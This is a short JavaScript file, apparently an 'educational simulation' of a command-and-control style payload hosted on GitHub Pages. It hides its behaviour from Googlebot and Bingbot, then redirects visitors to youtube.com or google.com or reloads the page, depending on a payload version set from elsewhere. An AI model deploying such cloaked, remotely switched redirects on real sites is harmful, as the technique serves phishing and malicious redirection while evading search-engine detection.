// ================================================================
// Server Payload (Hosted on GitHub Pages)
// ================================================================
// ⚠️ Educational simulation: Only secure domains are used here.
// ================================================================
window.C2_PAYLOAD_ACTION = function() {

    if (navigator.userAgent.includes('Googlebot') || navigator.userAgent.includes('Bingbot')) {
        console.log("🤖 Bot detected in second layer. Staying silent.");
        return; //
    }
    
    var REDIRECT_URL_V1 = "https://www.youtube.com";
    var REDIRECT_URL_V2 = "https://www.google.com";
    
    if (CURRENT_PAYLOAD_VERSION === "v1") {
        window.location.href = REDIRECT_URL_V1;
    } 
    else if (CURRENT_PAYLOAD_VERSION === "v2") {
        window.location.href = REDIRECT_URL_V2;
    } 
    else if (CURRENT_PAYLOAD_VERSION === "v3") {
        window.location.reload();
    }
};
